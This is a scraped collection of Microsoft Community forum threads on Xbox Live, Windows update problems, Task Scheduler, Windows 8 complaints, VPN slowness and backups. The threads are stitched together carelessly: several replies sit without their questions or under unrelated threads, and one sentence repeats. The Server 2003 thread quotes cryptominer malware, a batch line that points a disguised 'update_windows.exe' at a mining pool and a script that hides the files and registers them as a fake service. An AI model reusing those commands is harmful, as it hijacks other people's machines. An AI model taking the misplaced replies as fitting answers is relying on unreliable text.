    <title>3 Month xbox live subscription - Microsoft Community</title>

<h2>            3 Month xbox live subscription</h2>
                    
<p>Today, I noticed a deal on xbox live dashboard stating if you renew the 3 month xbox live subscription, you would receive an extra 3 months of xbox live. I went out and bought a 3 month card. When will the extra 3 months be credited to my account? I just
 redeemed my card around 6 central pm time.</p>
<p>Thanks,</p>
<p>James</p>

<p>Haven't got this promo in my country but i would think you need to buy the 3 months direct from the dashboard to qualify for the extra 3months &amp; not a subscription card from a shop.</p>

<p>that doesnt work</p>
<p>you need to buy the dashboard deal with a payment option</p>
<p>thats how all promotions work</p>
<p>it also takes 6-8weeks to be credited</p>
<p>prepaid cards are not payment options</p>

<h2>            Issues after Update &#47; Support is not reachable at all</h2>
                    <p>Hey I've run into severe Issues with my computer after a forced update from win 10.<br />
<br />
I tried to contact the support but the horrible contact agent (chat bot) keeps repeating the same **** over and over...when i click contact via chat...it restarts...contact via call a small window opens and keeps refreshing for ever... that happens on all attempts.
 there is no way for me to contact support except for this.</p>
<p>
</p><p>Yesterday windows forced one of it's annyoing updates upon me...it asked me every god damn hour to do it until i didnt notice it early enough and it happened by itself... after 2 hours of god damn updating my whole computer was screwed<br />
<br />
Now Cortana is broken cannot access her at all...search bar is gone. no way of enabling it.</p>
<p>
</p><p>i cannot access most of my settings as i always keep getting redirected to the initial settings page</p>
<p>
</p><p>My Wacom tablet is completly **** over... i keep getting the infamous hold for right click issue despite it beeing clearly disabled in the settings.</p>
<p>the tablet is not recognised as wacom tablet anymore and is not recognised by it's drivers anymore.</p>
<p>i also have to restart the wacom service manually to get it to work in the first place...it doesnt work automatically anymore after starting the computer</p>
<p>
</p><p>I have Issues when i try to connect to online games and stuff it just won't be able to create a connection randomly.<br />
<br />
There is far more that i cannot describe as i havn't figured out what kind of **** exaclty is going on...<br />
<br />
I'm pissed and frustrated that a **** update wasted a complete day trying to fix my computer and still beeing left with no support and no results.</p>
<p>
</p><p>I need help getting this PC running again asap. And i need help getting these absolute **** forced updates disabled.&nbsp;</p>
<p>I'm deeply frustrated with microsoft and their horrible business decisions since win10....<br />
<br />
Sorry for beeing vulgar...but i'm really at a point where my nerves can't handle all this **** anymore<br />
</p>

<p>Hi,<br />
<br />
We apologize for the inconvenience that this have caused you but don't worry we will try to assist you with your concern.<br />
<br />
One of the possible reasons why you are experiencing those issues after the update, is that the Windows Update files were corrupted. To better assist you with your concern, we'd like to ask some information.<br />
<br />
- What is the make and model of your computer?<br />
- What is the build and version of your Windows 10. You can check that by pressing the Windows button then type "winver" then press Enter.<br />
- Are you getting any error messages?<br />
<br />
You may refer to this article on how you can fix <a href="https://support.microsoft.com/en-ph/help/10164/fix-windows-update-errors" target="_blank" rel="noreferrer nofollow">
Windows Update issues</a>.<br />
Please be informed that you cannot disable Windows Update, Windows update ensure your device stays up to date with the latest security patches and improvements. You can set your connection to
<a href="https://support.microsoft.com/en-ph/help/4028458/windows-metered-connections-in-windows-10" target="_blank" rel="noreferrer nofollow">
metered connection</a> so that some updates will not be installed automatically.</p>
<p>
</p><p>Hope to hear from you soon.</p>

<p>Hey,</p>
<p>
</p><p>First of all thank you for replying to my furious post...i really appreciate it after ahours of trying to contact support somehow.</p>
<p>
</p><p>Regarding your questions.</p>
<p>
</p><p>Pc Model:</p>
<p>Self Build 64 Bit System (was running without any issues before update)</p>
<p>IntelCore i7-4790K @ 4.00 GHZ</p>
<p>Bios American Megatrends Inc. p1.90, 11.12.2013</p>
<p>Motherboard Asrock Fatality</p>
<p>16 GB Ram</p>
<p>Nvidia GTX 1070</p>
<p>2TB Harddrive</p>
<p>
</p><p>Windows 10 Pro&nbsp;</p>
<p>
</p><p>Version 1709 ( Build 16299.192)</p>
<p>
</p><p>I do not get any error messages what makes these issues even more complicated as they are hard to locate. All of the above mentioned issues appeared only after the update.</p>
<p>
</p><p>i already run the Update Troubleshooter without any noticeable differences.<br />
<br />
I will now try the Servicing Stack Update. hope that does not create any further issues.</p>
<p>EDIT: did not resolve the issue also not the next steps in the troubleshooter...currently running the sfc/scannow in powershell</p>
<p>
</p><p>cheers,</p>

<p>Hello Kelds,</p>
<p>
</p><p>Movies &amp; TV supports .mkv files by design. Please refer to this support article:
<strong><a href="https://support.microsoft.com/en-us/help/4028263/windows-file-formats-for-the-movies-tv-app" target="_blank" rel="noreferrer nofollow">File formats supported by the Movies &amp; TV app in Windows 10</a></strong>. If a file extension listed doesn't play,
 it might be using an unsupported audio codec. Some workarounds would include using a third-party media player and also converting the .mkv file to a different file format.</p>
<p>
</p><p>Note: Using Third Party Software, including hardware drivers can cause serious problems that may prevent your computer from booting properly. Microsoft cannot guarantee that any problems resulting from the use of Third Party Software can be solved. Using
 Third Party Software is at your own risk.</p>

<h2>            Task Scheduler won&#39;t run my scheduled tasks&#59; reports &#34;The wait operation timed out&#34; with error code 0x80070102</h2>
                    
<p>Hello,</p>
<p>I seem to be having a problem with Task Scheduler. I recently added a task to the library, set to run at 12:59 AM every day. However, every day, 12:59 AM comes and goes, and the task I have told Task Scheduler to run refuses to run. So I'm forced to go back
 to Task Scheduler to find out what went wrong with running the task, and I find out that "The wait operation timed out.", with error code 0x80070102. I know perfectly well that I have created and deleted this very same task countless times, and each time the
 task has run, it has worked perfectly well. So what happened here, that made Task Scheduler effectively refuse to run this task?</p>

<p><span>Hi Brandon Taylor,</span></p>
<p><span>&nbsp;</span></p>
<p><span>Use the “System” account for a task that should run at startup.</span></p>
<p><span>&nbsp;</span></p>
<p><span>Schedule a task and change the account for it manually in Windows Task Scheduler.</span></p>
<p><span>&nbsp;</span></p>
<p><span>Follow these steps:</span></p>
<p><span>&nbsp;</span></p>
<p><span><span>a.<span>&nbsp;&nbsp;&nbsp;&nbsp;</span></span></span><span>Click
 “Start” and click “All Programs”.</span></p>
<p><span><span>b.<span>&nbsp;&nbsp;&nbsp;&nbsp;</span></span></span><span>Click
 “Accessories”.</span></p>
<p><span><span>c.<span>&nbsp;&nbsp;&nbsp;&nbsp;</span></span></span><span>Under
 “System Tools”, click “Task Scheduler”.</span></p>
<p><span>&nbsp;</span></p>
<p><span>Under “Active Tasks” locate the task and double-click to expand the same. In the upper part of the window, right-click the task's name and select
 “Properties” &gt; “General” tab &gt; “Change User or Group” button.</span></p>
<p><span>&nbsp;</span></p>
<p><span>Under "Enter an object name to select", enter “SYSTEM”.</span></p>
<p><span>&nbsp;</span></p>
<p><span>This should fix the issue.</span></p>

<p>This didn't work. When I try to start the requested task, it simply hangs and does absolutely nothing. The Last Run Result area either shows "The Task Scheduler service has asked the task to run", or "The task is currently running", when in reality the task
 is doing absolutely nothing.</p>
<p>This leads me to believe that there may be something seriously wrong with Task Scheduler.</p>
<p>What next?</p>

    <title>Windows 10 Creator - Microsoft Community</title>
<h3> dragonwolves  say:</h3>
<h2>            Windows 10 Creator</h2>
                    Every time Windows 10 Creator is installed on my computer it runs until the next update is installed and reboots to a blue screen and states it failed to load. In running the Windows 10 Creator troubleshooter it tells me that my hard drive has failed but
 it is a new hard drive that is in the computer. I return to Windows 10 Pro and have no problems doing anything with my computer. Why does Microsoft force you to update to something that does not work and lock you out from any other updates until you run the
 Windows 10 Creator update (that has failed to run properly every time I have tried to run it for the last 6 months)??

<p>Hi, </p>
<p>
</p><p>Based on the image, you are getting the error code that says <strong>"INACCESSIBLE BOOT DEVICE."
</strong>This error usually indicates that the Windows operating system has lost access to the system partition during the startup process. When this happens, the system usually shuts itself down after showing a Blue Screen error in order to protect itself
 from data corruption or loss. </p>
<p>
</p><p>To start checking out the issue, you may refer to the answer of <strong>A.User
</strong>from this link:<span> <strong><a href="https://answers.microsoft.com/en-us/windows/forum/windows_10-update/windows-10-automatic-creators-update-and-error/88b7f365-0011-4bef-b053-d635524813dc">Windows 10 automatic Creators Update and error</a></strong><span><strong>.</strong></span></span></p>
<p>
</p><p>If the above link doesn't help, here are several troubleshooting steps that you can also do manually. Just try to check what applies to your case.</p>
<p>
</p><ol>
<li>If the issue is with the boot device,&nbsp; you may need to edit the boot options.</li><li>If you have recently added any new hardware, please try to remove it and see what happens.</li><li>Please check if the firmware version of your disk is compatible with Windows 10. If not, you may need to update to the disk's latest firmware.</li><li>If you have recently added a driver, restart your computer, enter <a href="https://support.microsoft.com/en-us/help/17419/windows-7-advanced-startup-options-safe-mode" target="_blank" rel="noreferrer nofollow">
Advanced Boot Options</a> menu<strong>, </strong>choose the <strong>Last Known Good Configuration</strong> option. You may also
<a href="https://support.microsoft.com/en-us/help/17419/windows-7-advanced-startup-options-safe-mode" target="_blank" rel="noreferrer nofollow">
boot Windows in Safe mode</a>, and do a system restore<strong>.<br />
</strong></li><li>If the cause is hard disk corruption, Run <em><strong>Chkdsk /f /r</strong></em> on the system partition<strong>.
</strong>If you cannot boot into Windows, use the Recovery Console and run <em><strong>Chkdsk /r</strong></em> or run Chkdsk from the Repair Console.</li><li>If there is need to do a clean install, you could also create a<strong><a href="https://www.microsoft.com/en-us/software-download/windows10" target="_blank" rel="noreferrer nofollow">Media Creation Tool
</a></strong>using another computer and save it to a USB device. You may also check out the topic
<strong>Using the tool to create installation media (USB flash drive, DVD, or ISO file)</strong> from the same link for reference.</li></ol>
<p>
</p><p>We will await your feedback.</p>

    <title>Windows 10 update faulted with deleting touchscreen drivers - Microsoft Community</title>
<h3> buricon  say:</h3>
<h2>            Windows 10 update faulted with deleting touchscreen drivers</h2>
                    <p>About 2 days following a recent reinstall of Windows 10, the touchscreen is non-responsive.
<strong>Touchscreen drivers do not show up in Device Manager</strong>, so <strong>
there is nothing to update or reinstall</strong> there.</p>
<p>
</p><p>Geek Squad geek mentioned this is a not-uncommon event involving Windows 10 and Windows Update - where a recent update (in the last 2 months or so) may be responsible for touchscreen drivers disappearing.
<em>Please confirm</em>.</p>
<p>
</p><p>I have been unable to find a topic that addresses this as a possible widespread issue with Windows 10, Windows Update, and disappearing touchscreen drivers.</p>

<p>Halo CE is a totally different game then Reach. CE is where it all starts, you learn about the rings, the Covanent, and more importantly, the Flood. The whole game comes together as all these forces are battling for the power of Halo. It what ties all the
 other Halo's together, IMO.</p>

<p>if you don't know the story of the Halo games, then the easiest way to explain it is, this is the immediate sequel to Reach.</p>
<p>Multiplayer is in Reach, but has matchmaking playlists that have the same gameplay mechanics as the original game (no armor abilities, only halo 1 weaponry avaliable, overpowered pistol)</p>

<p>No, you can still play multiplayer, just not the "Reach multiplayer". If you get reach, then you'll have access to the CEA multi maps in the Reach Multiplayer as well. &nbsp;</p>

<p>Yes if you have Reach you can download the Halo Anniversary playlist maps and play them on Reach, without having Halo CE.&nbsp;&nbsp;&nbsp; You dont need Halo CE to play the CE playlist.&nbsp; Hope that helps.</p>

    <title>The Microsoft Refrigerator - Microsoft Community</title>
<h3> andrew campanelli  say:</h3>
<h2>            The Microsoft Refrigerator</h2>
                    <p>Since I do not know how to "reach" to the truly idiotic geeks at Microsoft who are causing Microsoft to put out products as abysmal as Windows 8, I hope to use symbols to communicate with them.</p>
<p style="text-align: center">
</p><p style="text-align: center"><span style="text-decoration-line: underline">The Microsoft Refrigerator</span></p>
<p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
<p>New from Microsoft is the Microsoft refrigerator. <span>&nbsp;</span>When it arrives, you'll notice that the door to the refrigerator has no handle.<span>&nbsp;
</span>Nor does it have any signs or notes telling you from which direction the door opens, or how to open it.<span>&nbsp;
</span>This feature is brought to you by the genius who conceived of "charms" hidden in Windows 8, to ensure that you will curse at least once while trying to figure out how to shut down your laptop or desktop for the first time.<span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></p>
<p>To cause the refrigerator to first get cold, and before you can store anything inside of it, you must first call Microsoft, register the refrigerator with them, and open a video-account with them, so Microsoft can see everything you place inside
 your refrigerator at any time.<span>&nbsp; </span>This feature is brought to you by the dweeb who thought it was a good idea to require you to register with Microsoft, just to be able to use a computer which has the Windows 8 operating system
</p>
<p>Once your video-registry for your refrigerator is complete, you can open the door, and once you do, an arm will automatically extend out to you with a ham sandwich, and the door will then close.
<span>&nbsp;&nbsp;</span>It doesn't matter that you wanted to eat something other than a ham sandwich, because Microsoft has decided that since you’ve eaten a ham sandwich in the past, that's what you will eat now.<span>&nbsp;
<span>&nbsp;&nbsp;</span>It doesn't matter that you wanted to eat something other than a ham sandwich, because Microsoft has decided that since you’ve eaten a ham sandwich in the past, that's what you will eat now.<span>&nbsp;
</span>This feature is brought to you by the imbecile who created the auto-formating features in Microsoft Word which make it virtually impossible for users to simply set-up documents they way they want to, but instead are forced to fight with
 Word, every time they have the audacity to indent something and thereafter proceed to try to start a new paragraph.</p>
<p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
<p><span>&nbsp;</span>I could go on, but I hope perhaps, the next time one of the idiots at Microsoft come up with another one of these truly moronic ideas, they may ask themselves, would I want this feature on my refrigerator?</p>
<p>&nbsp;</p>
<p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

            <p>I voluntarily bought Windows 8. In fact, I was an early adopter in about January 2013 and did the installation myself in my new custom-built PC. Most people won't do that though, they will go to their local computer shop and buy a new PC with the OS built-in.
 It has always been standard PC practice to have the latest OS available with new hardware. If you don't want the latest OS, it is entirely up to you to do the research to find out how to get an earlier version. In some cases, you can buy you PC online so you
 can customize what hardware and OS you receive.</p>
<p>
</p><p>The problem with Windows 8 really is that user's aren't willing to learn something new. In many ways, Windows 8 has become a lot easier to use but if people don't put the effort forward to do a simple tutorial - they get easily frustrated and want to return
 the product.</p>

            <p>I am glad that you are having a positive experience with Windows 8.&nbsp; You are the exception.&nbsp;
</p>
<p>
</p><p>Unlike you, I bought a high-end laptop which came with Windows 8 preloaded.&nbsp; I paid over $1,500 for the laptop, intending to use it for work. I bought it on a Friday night, thinking I could have it configured for work by Monday.&nbsp; Nothing could have been
 further from the truth.&nbsp; </p>
<p>
</p><p>Yes, it has a "learning curve," but I was not above going online and finding answers to questions like, how to shut down the power, or close a program in Windows 8.&nbsp; Aside from the fact that this required me to waste time I should not have been forced to
 waste, the real problem was the half-baked OS system itself.&nbsp; </p>
<p>
</p><p>I tried to install three basic programs onto the machine and none of the three would operate.&nbsp; Nor did the computer recognize any of my printers, which meant that I had to scour the internet to find printer drivers to download.&nbsp; After wasting two days, I
 gave up and returned the laptop to the store (BestBuy) for a full refund.&nbsp; As I waited on the return line, I realized that the other people on the line were also returning computers they had just purchased because of Windows 8.</p>
<p>
</p><p>Say what you will, but Windows 8 was designed primarily for those who use computers mostly for youtube, facebook and music.&nbsp; For those of us who rely upon computers to do actual work, Windows 8 is a counter-intuitive, time wasting, abomination.
</p>
<p>
</p><p>It is clearly emblematic of an attitude, on the part of Microsoft, that they are simply too arrogant or stupid to be concerned about the need or convenience of actual users.</p>

<p>Oh, I don't know.&nbsp; Maybe its evidenced by the fact that HP has issued a press release saying that "because of popular demand" it is now selling its new PC's with Windows 7. Translation, HP has received so many complaints about Windows 8, and its PC sales
 have tanked so badly because of Windows 8, that it is now selling its brand new PC's with a previous version of the OS.

            <p>What are these three basic programs? Are they really old and not supported at all? Are the printers you trying to install really old and not supported either? As with all new operating systems, due to the many changes&nbsp;made in the new operating systems&nbsp;some
 older programs&nbsp;or hardware&nbsp;will not function properly or install. It's up to the company that designs the software or hardware to make it compatible.</p>
<p>
</p><p>Companies are infamous for holding onto old computers and old hardware as long as possible till they are forced to upgrade. Even I at my company was running on a Windows XP machine, running a Pentium 4 with 1GB of RAM (a machine that would have been state
 of the art about 10-12 years ago) until finally I bugged our IT administrators to get a new machine. Then I got a computer that finally matched today's standards - Quad-core CPU with 16GB of RAM running under Windows 7. My productivity increased exponentially
 since I didn't have to wait for things to load.</p>
<p>
</p><p>Microsoft does its best trying to help users out by providing many built-in drivers for many devices and printers so it's just plug and play. They also provide compatibility&nbsp;options for older programs so they run properly and in Windows 8 the compatibility
 options date ALLLLLL the way back to Windows 95 so older programs should run.</p>
<p>
</p><p>Now Windows 8 can run anything for work or for play. A lot of the new modern apps are designed more for play but the desktop (which basically runs exactly like Windows 7) has everything you need to run older programs. All you need to know is how to use it.</p>

<p>Actually, NO.&nbsp; The auto-formating CANNOT easily be turned off for all of the stupid things which Word now does.&nbsp;
</p>
<p>
</p><p>When you turn off all of the auto-format features, Word STILL refuses to permit you to (1) indent a paragraph, (2) press return to start a new paragraph, and (3) start the new paragraph with an indent which is less than the preceding paragraph.&nbsp; And thus
 the unkind words for whoever caused the program to work this way.&nbsp; I would like to set my own indents, and not to waste my time wrestling with software which refuses to allow me to do same.</p>
<p>So to the idiot who dreamed up this "feature," how about letting users choose to "turn on" any automatic features they choose, instead of forcing users to TURN OFF features they never asked for, to try to figure out how to stop the program from doing things
 that they don't want it to do.</p>
<p>&nbsp; </p>
<p>As for the registration option you describe, let me get this straight.&nbsp; I buy a brand new computer, and when I fire it up, I have to register it with Microsoft, OR, I can waste time trying to figure out how to "create a local account."&nbsp; Why must I be forced
 to waste my time trying to figure this out?&nbsp; Why, because the brainchilds at MS couldn't give a rats patoot about what is convenient for users or what users want.</p>
<p>
</p><p>This is why I am loading Ubuntu on my latest computer to test it.&nbsp; If it works, I will replace the MS OS's on all 7 of my computers, because I realize that MS is so arrogant that Windows 9 will not be anything like 7.&nbsp; It will be Windows 8, with more lipstick,
 as MS continues to ram down our throats what it decides we should use.&nbsp;&nbsp; I've had quite enough of that.</p>

            <p>Here are some reasons why MS wants you to use a Microsoft account with Windows 8:</p>
<ul>
<li>To easily connect your Hotmail account with the Mail app</li><li>Use the Xbox gamer tag to earn achievements in Xbox Live games available from the&nbsp;Microsoft Store</li><li>Buy apps/games from the Microsoft Store and charge them to your MS account</li><li>Use Skydrive for backing up your data</li></ul>
<p>They want to provide you with the services they provide in Windows 8 but of course they are optional and you don't have to use if you don't want to. A local account will make sure you stay away from Microsoft services.</p>

            <p>That's strange then that both Microsoft's own financial earnings and independent IDC and other sources site that Windows sales are not only up, but setting record sales numbers and record profits, and that Microsoft stock is climbing higher and higher since
 Windows 8 came out:</p>

<h2>            Server 2003 update_windows.exe</h2>
                    <p><span>I have an old server running Server 2003. Recently it has become very slow. There is a process running called update_windows.exe
 that is using 90+ percent of resources. If I kill the process it just restarts. There is no service associated with it in "tasklist" and my virus checker and malware software cannot find a problem. Is this a genuine Microsoft process (presumably to do with
 update) or is this some sort of virus?</span></p>
<p><span>My mail stores are also corrupted, but I'm not sure if this is connected. I don't want to fix and mount the mail stores until
 I am sure about what is going on with this other process.</span></p>

<p>I followed Taylor's advice and was able to identify these files and kill Update_Windows (after killing debug.exe. &nbsp;</p>
<p>
</p><p>As of yesterday afternoon, I think this thing killed Terminal Services (users can no longer connect to the mapped drive) and I can no longer RDP to this server.</p>
<p><br />
The bigger question is "WTF is this?" &nbsp;At first glance it looks like a bitcoin mining operation.<br />
<br />
There are 4 hidden files Taylor mentions:<br />
<span><span>debug.exe,&nbsp;</span></span><span><span>debug.bat,&nbsp;</span></span><span><span>update_windows.exe,&nbsp;</span></span><span><span>dll.bat</span></span><br />
<br />
debug.bat says:<br />
<span>Update_Windows -o stratum+tcp://xmr.pool.minergate.com:45560 -u *** Email address is removed for privacy *** -p x -dbg -1</span><br />
</p>
<p>while dll.bat says:</p>
Attrib +s +a +h +r C:\Windows\debug\debug.exe<br />
Attrib +s +a +h +r C:\Windows\debug\debug.bat<br />
Attrib +s +a +h +r C:\Windows\debug\dll.bat<br />
C:\Windows\debug\debug.exe install "Windows_Debug" "C:\Windows\debug\debug.bat"<br />
C:\Windows\debug\debug.exe start Windows_Debug</p>
<p>
</p><p>Scary to say the least. &nbsp;This is a quickbooks server. &nbsp;Any recommendations?</p>
<p>
</p><p>Of course, I've got a user that wants to log in and do work this weekend :/</p>

<p>Hi Ryan&nbsp;</p>
<p>I didn't have any problems as you are describing??&nbsp;</p>
<p>Certainly all the drive mappings are fine and users can access them. I haven't tried RDP yet as the www publishing service is down on the server until I get into the office tomorrow and restart it.&nbsp;</p>
<p>Only other problem I saw was corrupted exchange mail stores, and I'm not sure if the two were connected??&nbsp;</p>
<p>Only thing I didn't do from suggestions was delete debug.exe because it wouldn't let me and I haven't bothered to sort that out yet.&nbsp;</p>

<p>Hi Ryan,</p>
<p>
</p><p>I see what you mean now!</p>
<p>
</p><p>Can't RDP into the server and the server cannot access the internet, although it does have external connection as virus checker etc. can update quite happily.</p>
<p>
</p><p>Drive mappings within the domain are fine and accessible, but cannot access intranet or Exchange remote access from domain computers.</p>
<p>
</p><p>Did you solve your RDP problem?</p>
<p>
</p><p>Been told I shouldn't post these questions here, so will try technet forums, just wanted to update you.</p>

<p>I thought I would add that when I came across this issue, I also deleted references to those files in the registry.&nbsp;</p>
<p>
</p><p>After cleaning it out and rebooting, file sharing no longer worked.</p>
<p>
</p><p>I found several services that wouldnt start with dependency errors, including Workstation. I uninstalled the Client for Microsoft Networks on the network adapter and rebooted the server, then added the client back in (no reboot required). That seemed to
 get things working again.&nbsp;</p>

    <title>Very slow opening and using network system tray icon and PPTP - Microsoft Community</title>
<h3> andys_03  say:</h3>
<h2>            Very slow opening and using network system tray icon and PPTP connections.  NetIs it possible to have too many PPTP connections&#63;</h2>
                    <div>This is for Windows 7 Pro.</div>
One of the functions of my job is to maintain and service VOIP PBXes for my customer. &nbsp;The one that we use has a built-in &nbsp;PPTP server for administrative purposes. &nbsp;I have over 100 different PPTP VPN connections set-up in my Network Connections control panel.
<div><br />
</div>
<div>Recently, things bogged down considerably. &nbsp;To connection to a system, I click on the network icon in the system tray, choose the VPN I want to connect to and click Connect. &nbsp;Usually it is very quick. &nbsp;Recently, it started taking a (relatively) long time
 to go through each one of these steps. &nbsp;I might see a delay of over a minute from the time I clicking on the network icon and system tray. &nbsp;It can take another minute or two from the time I click connect until it actually starts to connect (otherwise it stays
 frozen.) &nbsp;Doing other things such as trying to open the properties of any of the connections can take a similarly long time.&nbsp;</div>
<div><br />
</div>
<div>My PC is not lagging in any other way. &nbsp;At the same time this happens, other programs open, close and perform well with no issues. &nbsp;I tried deleting a handful of connections I no longer need without effect. &nbsp;Rebooting also did not help.</div>
<div><br />
</div>
<div>This is the second time this has happened to me. &nbsp;The last time I reformatted as I can't keep my customers on hold for 4 or 5 minutes while trying to connect to their PBX, a process that usually takes seconds. &nbsp;In both cases, I had over 100 different PPTP
 connections listed in my Network Connections control panel. &nbsp;I'm wondering:</div>
<div><br />
</div>
<div>1. &nbsp;Is there any way to resolve this issue without reformatting and reinstalling/reloading an image? &nbsp;That's a pain.</div>
<div>2. &nbsp;Is there a limit to the amount of PPTP connections I &nbsp;can create? &nbsp;Am I corrupting something by creating so many?</div>
<div><br />
</div>
<div>Please let me know if you need any more information.</div>
<div><br />
</div>
<div>Edit: &nbsp;A system restore to a date when I had 5 less connections fixed the issue. &nbsp;I'm now relatively sure Win7 does not like it if you set up too many PPTP connections. &nbsp;I'll try to keep it under 100 for the time being. &nbsp;I was still wondering if anyone
 can confirm this?</div>
                </div>

    <title>Windows Store Server Timeout&#63; - Microsoft Community</title>
<h3> kyranhannan  say:</h3>
<h2>            Windows Store Server Timeout&#63;</h2>
                    <p>Greetings Microsoft Community.</p>
<p>
</p><p>A couple of the last times I have tried to connect to the Windows Store I receive an error:</p>
<p>"We weren't able to connect to the Store. This might have happened because of a server problem or the network connection timed out. Please wait a few minutes and try again. (0x80080005)"</p>
<p>The store was working fine a couple of days ago, and I can't figure what I could have done to make this error pop up every time I open the store (with a Wi-Fi internet connection active of course). I have tried on three different Wi-Fi networks... all of
 which gave me access to the store a couple of days ago... I have looked at other topics posted on the community concerning this question and have followed the answered steps to various troubleshooting and resetting, rebooting, and cache clearing methods (WSReset.exe).
 I usually use a Wi-Fi connection. At the beginning of the error, I could initially 'connect' to the store and view apps, but when I selected 'Install' the little dots would slide across the screen as it tried to access the server and grab the data needed for
 the download, but it would eventually show a timeout error. I tried this on two different apps in the Store and I received the same result with both.</p>
<p>The next day, after shutting down the computer the previous day, I switched on the computer (I usually use my computer with it plugged in, if that helps) and tried to access the Store again. This time it just timed out without letting me even access the
 Store's home. Is this a server error that has been happening recently?</p>
<p>
</p><p>Thank you in advance.</p>
<p>If there is any more information I can provide to help solve the problem please let me know.</p>
<p>Kyran</p>

            I fixed this issue by changing the name of the 'Windows.old' folder on the OS drive. You can change it to 'anything.old' and it will fix this issue.

    <title>Cannot open USMT2.IMG file. - Microsoft Community</title>
<h3> paul spiers  say:</h3>
<h2>            Cannot open USMT2.IMG file.</h2>
                    i cannot open a file from my flash drive. the file name is USMT2.IMG&nbsp; (that is I, as in capital i)&nbsp; this is a DAT file.<br />
<br />
i was backing up files, from my documents, to a Kingston DataTraveler 101, 8GB ( DT101G2/8GBZCR ).
<br />
i achieved success by the drag and drop method. then all of a sudden (don't know what i did different), all the remaining files got sucked into one large mega file (654MB), in a matter of seconds. i might have used the transfer wizard after a break instead
 of drag and drop. i honestly can't remember. i was in shock.<br />
<br />
i found a web site attended by some "elite" puter dudes.&nbsp;&nbsp;&nbsp; <br />
&nbsp;http://neppers.blogspot.ca/2008/10/restore-usmt2unc-with-fastconvexe.html<br />
<br />
they have had the same problem and come up with a solution. i do not have the skills to do what they did. i would need help.<br />

            <p>Perhaps you've compressed your description of what happened.&nbsp; You probably did use the Files and Settings Transfer (F.A.S.T or FAST) Wizard.&nbsp; The output from FAST is a folder named USMT2.UNC that contains a file named IMG00001.DAT (or similar).&nbsp; Does that
 ring a bell?</p>
<p>
</p><p>FAST is not meant to be used for backups but to transfer files and settings from one computer to another.&nbsp; Although it may be possible to recover files from the compressed output of the FAST wizard, if all you were doing is creating a backup of existing
 files, why not just format the flash drive and start over?</p>
<p>
</p><p><strong>EDIT TO ADD</strong>:</p>
<p>
</p><p>The following is just so I won't forget the links if you come back and say that you need to get the files out of the compressed DAT file that was created.</p>
<p>
</p><p>The "elite puter dudes" didn't come up with that solution.&nbsp; For a much more detailed explanation, see
<a href="http://windowsxp.mvps.org/fast.htm" target="_blank" rel="noreferrer nofollow">http://windowsxp.mvps.org/fast.htm</a>.&nbsp; Reading a bit between the lines, it looks like the FastConv utility was developed at Microsoft but later abandoned.</p>

            Hi Robert
<br />
<br />Could you confirm if this also happens in the default Administrator account?
<br />
<br />Open Start
<br />Type: cmd
<br />Right click CMD
<br />Click Run as administrator
<br />
<br />At the command prompt, type:
<br />net user administrator /active:yes
<br />
<br />Hit Enter
<br />
<br />Close command prompt, restart, then try signing into the Administrator account.
<br />
<br />Try running the file again.
